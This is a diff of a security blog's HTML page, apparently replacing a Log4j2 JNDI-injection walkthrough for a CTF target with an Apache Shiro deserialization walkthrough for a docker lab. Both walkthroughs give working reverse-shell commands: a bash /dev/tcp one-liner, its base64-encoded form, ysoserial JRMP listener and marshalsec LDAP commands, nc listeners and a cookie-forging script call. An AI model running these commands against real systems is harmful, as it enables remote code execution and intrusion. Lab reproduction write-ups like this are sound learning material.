@@ -4,8 +4,11 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Log4j2_rce复现, CTF,渗透测试,web安全,内网渗透,Python,漏洞复现,攻防对抗">
-    <meta name="description" content="Apache_log4j2反弹shell前言:12月10号凌晨，twitte爆出核弹级漏洞Apache_log4j2的RCE。log4j2作为一款优秀的日志记录工具，应用面非常广，因此整个互联网行业或多或少都受到影响。凑热闹的我也是利用bu">
+    <meta name="keywords" content="Apache_shiro反序列化漏洞, CTF,渗透测试,web安全,内网渗透,Python,漏洞复现,攻防对抗">
+    <meta name="description" content="靶场搭建
+docker pull medicean/vulapps:s_shiro_1    #获取docker镜像
+systemctl restart docker        #重启docker
+docker run -d -p 80">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +20,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Log4j2_rce复现 | fuzz&#39;s blog</title>
+    <title>Apache_shiro反序列化漏洞 | fuzz&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -340,12 +343,12 @@ if (windowWidth > 768) {
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Log4j2_rce复现</h1>
+                    <h1 class="description center-align post-title">Apache_shiro反序列化漏洞</h1>
                 </div>
             </div>
         </div>
@@ -481,8 +484,8 @@ if (windowWidth > 768) {
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/" class="post-category">
-                                中间件漏洞
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                漏洞复现
                             </a>
                         
                     </div>
@@ -508,14 +511,14 @@ if (windowWidth > 768) {
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    495
+                    553
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    2 分
                 </div>
                 
 
@@ -535,51 +538,61 @@ if (windowWidth > 768) {
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="Apache-log4j2反弹shell"><a href="#Apache-log4j2反弹shell" class="headerlink" title="Apache_log4j2反弹shell"></a>Apache_log4j2反弹shell</h3><p>前言:12月10号凌晨，twitte爆出核弹级漏洞Apache_log4j2的RCE。log4j2作为一款优秀的日志记录工具，应用面非常广，因此整个互联网行业或多或少都受到影响。凑热闹的我也是利用bugku的靶场复现了这个漏洞。</p>
-<h4 id="bugku靶场地址-https-ctf-bugku-com-challenges-detail-id-340-html-page-1"><a href="#bugku靶场地址-https-ctf-bugku-com-challenges-detail-id-340-html-page-1" class="headerlink" title="bugku靶场地址:https://ctf.bugku.com/challenges/detail/id/340.html?page=1"></a>bugku靶场地址:<a target="_blank" rel="noopener" href="https://ctf.bugku.com/challenges/detail/id/340.html?page=1">https://ctf.bugku.com/challenges/detail/id/340.html?page=1</a></h4><h4 id="一、探测是否存在漏洞-假定自己不知道"><a href="#一、探测是否存在漏洞-假定自己不知道" class="headerlink" title="一、探测是否存在漏洞(假定自己不知道)"></a>一、探测是否存在漏洞(假定自己不知道)</h4><p>1.我们先从dnslog平台获得一个子域名</p>
-<p><img src="../images/Apache_log4j/1.png"></p>
-<p>2.构造poc</p>
-<pre><code>${jndi:ldap://7j2fvt.dnslog.cn/EXP}
+                <p><strong>靶场搭建</strong></p>
+<pre class=" language-sh"><code class="language-sh">docker pull medicean/vulapps:s_shiro_1    #获取docker镜像
+systemctl restart docker        #重启docker
+docker run -d -p 8082:8080 medicean/vulapps:s_shiro_1   #启动docker镜像
+访问靶机的8082端口即可
 </code></pre>
-<p>3.验证</p>
-<p><img src="../images/Apache_log4j/2.png"></p>
-<p>我们点击提交，然后查看dnslog平台</p>
-<p><img src="../images/Apache_log4j/3.png"></p>
-<p>发现有记录，存在漏洞</p>
-<h4 id="二、构造反弹shell的恶意类"><a href="#二、构造反弹shell的恶意类" class="headerlink" title="二、构造反弹shell的恶意类"></a>二、构造反弹shell的恶意类</h4><p>这里反弹shell我们用的是nc以及命令行是/bin/sh，至于为什么这是出题者设置的。</p>
-<p><img src="../images/Apache_log4j/4.png"></p>
-<p>好的，上恶意类</p>
-<p><img src="../images/Apache_log4j/5.png"></p>
-<p><strong>这里有两个注意点</strong></p>
-<p>1.我们的类名和我们最后保存的文件名一样（否则无法编译）</p>
-<p>2.这里的ip是自己vps的ip，端口就是你想反弹shell到自己vps哪个端口</p>
-<p>我们将我们构造好的exp.java编译一下</p>
-<pre class=" language-shell"><code class="language-shell">javac exp.java
+<p><strong>环境</strong></p>
+<p>靶机：192.168.3.125</p>
+<p>攻击机：192.168.3.118</p>
+<p><strong>工具：</strong></p>
+<p>ysoserial.jar</p>
+<p>exp.py</p>
+<p>nc</p>
+<p>ShiroExploit.V2.0</p>
+<p>我们访问192.168.3.125:8082输入用户名密码（随便输入）并且勾选上remember me利用burp抓包</p>
+<p><img src="../images/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png"></p>
+<p>我们看响应包发现rememberMe=deleteMe由此证明存在shiro反序列化漏洞</p>
+<p><img src="../images/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png"></p>
+<h3 id="我们首先利用纯手工实现shiro序列化反弹shell"><a href="#我们首先利用纯手工实现shiro序列化反弹shell" class="headerlink" title="我们首先利用纯手工实现shiro序列化反弹shell"></a>我们首先利用纯手工实现shiro序列化反弹shell</h3><h4 id="1-制作反弹shell代码"><a href="#1-制作反弹shell代码" class="headerlink" title="1.制作反弹shell代码"></a>1.制作反弹shell代码</h4><p>我们先生成初始反弹shell代码</p>
+<pre class=" language-sh"><code class="language-sh">bash -i >& /dev/tcp/192.168.3.118/888 0>&1
 </code></pre>
-<p><img src="../images/Apache_log4j/6.png"></p>
-<p>接着我们利用python3建立一个http服务，使得我们到时候能够请求到exp.class</p>
-<pre><code>python3 -m http.server 8888
+<p>接着我们在<a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html%E8%BF%9B%E8%A1%8C%E7%BC%96%E7%A0%81">http://www.jackson-t.ca/runtime-exec-payloads.html进行编码</a></p>
+<p><img src="../images/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png"></p>
+<h4 id="2-使用ysoserial中JRMP监听模块，监听666端口"><a href="#2-使用ysoserial中JRMP监听模块，监听666端口" class="headerlink" title="2.使用ysoserial中JRMP监听模块，监听666端口"></a>2.使用ysoserial中JRMP监听模块，监听666端口</h4><p>进入ysoserial.jar所在目录，执行以下代码，监听666端口</p>
+<pre class=" language-sh"><code class="language-sh">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 666 CommonsCollections4 '编码内容'
 </code></pre>
-<p><img src="../images/Apache_log4j/7.png"></p>
-<p>至此我们的恶意类以及准备好了</p>
-<h4 id="三、开启ldap或者rmi服务"><a href="#三、开启ldap或者rmi服务" class="headerlink" title="三、开启ldap或者rmi服务"></a>三、开启ldap或者rmi服务</h4><p>这里我们需要用到marshalsec（安装的自己安装一下）</p>
-<p>我们进入marshalsec的target目录，开启我们的ldap服务</p>
-<pre><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://vpsip:8888/#exp" 9999
+<p>编码内容是刚刚编码之后的代码也就是</p>
+<pre class=" language-sh"><code class="language-sh">bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTE4Lzg4OCAwPiYx}|{base64,-d}|{bash,-i}
 </code></pre>
-<p><strong>注意：这里的ip和端口是我们开启http服务的ip和端口。这里的#不可省略,9999是ldap服务端口</strong></p>
-<p><img src="../images/Apache_log4j/8.png"></p>
-<h4 id="四、反弹shell"><a href="#四、反弹shell" class="headerlink" title="四、反弹shell"></a>四、反弹shell</h4><p>首先我们启动nc，我在恶意类中设置的反弹端口是888</p>
-<pre><code>nc -nlvvp 888
+<p>此时我们完整的执行代码就是</p>
+<pre class=" language-sh"><code class="language-sh">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 666 CommonsCollections4 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTE4Lzg4OCAwPiYx}|{base64,-d}|{bash,-i}'
 </code></pre>
-<p><img src="../images/Apache_log4j/9.png"></p>
-<p>构造我们payload提交</p>
-<pre><code>${jndi:ldap://自己vpsip:9999/exp}
+<p><img src="../images/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png"></p>
+<h4 id="3-生成cookie"><a href="#3-生成cookie" class="headerlink" title="3.生成cookie"></a>3.生成cookie</h4><p>前提：我们python必须安装了pycrypto库。没安装的可以执行以下命令安装</p>
+<pre class=" language-python"><code class="language-python">pip install pycrypto
 </code></pre>
-<p><strong>这里的端口是我们ldap服务开启端口</strong></p>
-<p><img src="../images/Apache_log4j/10.png"></p>
-<p>ok，我们此时成功反弹shell</p>
-<p><img src="../images/Apache_log4j/11.png"></p>
-<p>至于flag自己找一下就行</p>
+<p>我们执行如下代码即可生成包含攻击代码的cookie</p>
+<pre class=" language-sh"><code class="language-sh">python exp.py 攻击者ip:ysoserial监听的端口
+</code></pre>
+<p>此时我们的攻击机执行的代码是</p>
+<pre class=" language-sh"><code class="language-sh">python exp.py 192.168.3.118:666
+</code></pre>
+<p><img src="../images/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.png"></p>
+<p>我们可以看见此时已经生成了含有攻击代码的cookie</p>
+<h4 id="4-nc监听，burp修改cookie"><a href="#4-nc监听，burp修改cookie" class="headerlink" title="4.nc监听，burp修改cookie"></a>4.nc监听，burp修改cookie</h4><p>我们利用nc开始监听我们最初反弹shell的端口</p>
+<pre class=" language-sh"><code class="language-sh">nc -lvvp 888
+</code></pre>
+<p>接着我们利用burp修改cookie<img src="../images/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png"></p>
+<p>最后发包就可以成功反弹shell</p>
+<p><img src="../images/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png"></p>
+<h3 id="我们接下来使用工具自动化完成shiro反序列化利用"><a href="#我们接下来使用工具自动化完成shiro反序列化利用" class="headerlink" title="我们接下来使用工具自动化完成shiro反序列化利用"></a>我们接下来使用工具自动化完成shiro反序列化利用</h3><p>我们使用ShiroExploit.V2.0，双击ShiroExploit.jar打开工具</p>
+<p><img src="../images/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png"></p>
+<p>我们在url处输入存在shiro反序列化漏洞的url地址，选择命令执行。不断切换我们的列（PAYLOAD）尝试哪个payload可以利用，最后我们输入我们要执行的命令即可进行远程命令执行。</p>
+<p>这里我环境的payload是CommonsCollections2</p>
+<p><img src="../images/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9.png"></p>
 
                 
             </div>
@@ -606,7 +619,7 @@ if (windowWidth > 768) {
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://eternity-fuzz.github.io/posts/61fa.html">https://eternity-fuzz.github.io/posts/61fa.html</a>
+                    <a href="https://eternity-fuzz.github.io/posts/efed.html">https://eternity-fuzz.github.io/posts/efed.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1091,9 +1104,10 @@ if (windowWidth > 768) {
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/posts/efed.html">
                     <div class="card-image">
@@ -1111,9 +1125,9 @@ if (windowWidth > 768) {
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-01-16
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-16
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -1126,6 +1140,7 @@ if (windowWidth > 768) {
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -1152,13 +1167,13 @@ if (windowWidth > 768) {
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/posts/af27.html">
+                <a href="/posts/61fa.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="shiro 反序列化复现">
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="Log4j2_rce复现">
                         
-                        <span class="card-title">shiro 反序列化复现</span>
+                        <span class="card-title">Log4j2_rce复现</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1169,14 +1184,14 @@ if (windowWidth > 768) {
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-09-04
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-16
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
-                                    漏洞复现
+                            <a href="/categories/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/" class="post-category">
+                                    中间件漏洞
                                 </a>
                             
                             
@@ -1190,8 +1205,12 @@ if (windowWidth > 768) {
                         <span class="chip bg-color">漏洞复现</span>
                     </a>
                     
-                    <a href="/tags/Web/">
-                        <span class="chip bg-color">Web</span>
+                    <a href="/tags/Apache/">
+                        <span class="chip bg-color">Apache</span>
+                    </a>
+                    
+                    <a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/">
+                        <span class="chip bg-color">中间件</span>
                     </a>
                     
                 </div>
